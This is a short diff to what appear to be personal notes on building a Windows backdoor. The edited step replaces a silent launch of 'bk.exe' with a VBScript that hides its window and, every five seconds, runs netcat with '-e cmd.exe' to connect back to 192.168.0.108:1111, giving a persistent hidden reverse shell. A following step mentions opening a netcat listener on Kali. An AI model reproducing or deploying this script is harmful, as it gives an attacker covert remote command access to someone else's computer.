@@ -75,10 +75,12 @@ int main() {
                                           #c file save bk.c
 
 #3 second not show pop code in vbs
- 
- Set objShell = CreateObject("WScript.Shell")
-objShell.Run "bk.exe", 0, False
-Set objShell = Nothing
+
+Set objShell = WScript.CreateObject("WScript.Shell")
+Do
+	WScript.Sleep 5000
+	objShell.Run "C:\Users\wiin7\Desktop\nc.exe 192.168.0.108 1111 -e cmd.exe", 0, False
+Loop
 
 #4 open kali netcat server open 
 
